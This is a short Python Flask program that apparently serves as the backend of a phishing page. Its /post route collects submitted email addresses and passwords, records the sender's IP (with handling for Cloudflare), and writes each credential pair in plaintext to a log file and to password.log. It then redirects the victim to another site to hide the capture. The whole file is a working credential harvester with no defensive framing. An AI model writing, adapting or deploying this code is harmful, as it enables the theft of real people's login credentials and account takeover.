from flask import Flask, request, render_template, redirect
import logging
from datetime import datetime
from urllib.parse import parse_qs

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")

@app.after_request  # Run this function after every HTTP request
def no_cache(resp):
    resp.headers["Cache-Control"] = "no-store"  # Prevent the browser from caching the response

    return resp  # Return the modified response

@app.route("/", methods=["GET"])  # Define the "/" route and allow GET requests
def index():  # Define the function that handles requests to "/"
    return render_template("index.html")  # Render and return the index.html template

@app.route("/post", methods=["POST"])  # Define the "/post" route and allow POST requests
def post():  # Define the function that handles POST requests to "/post"

    email = request.form.get("email", "")
    password = request.form.get("password", "")

    # Fallback in case cloudf change body. 
    if (not email or not password) and request.data:
        try:
            raw = request.get_data(as_text=True)
            parsed = parse_qs(raw)
            email = email or parsed.get("email", [""])[0]
            password = password or parsed.get("password", [""])[0]
        except Exception:
            pass

    ip = request.headers.get("CF-Connecting-IP") or request.remote_addr
    ts = datetime.utcnow().isoformat()

    app.logger.info("Input from %s | Email: %s | Password: %s", ip, email, password)
    with open("password.log", "a", encoding="utf-8") as f:
        f.write(f"{ts} | {ip} | Email: {email} | Password: {password}\n")


    return redirect("https://www.example.com") # the page that opened after post

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)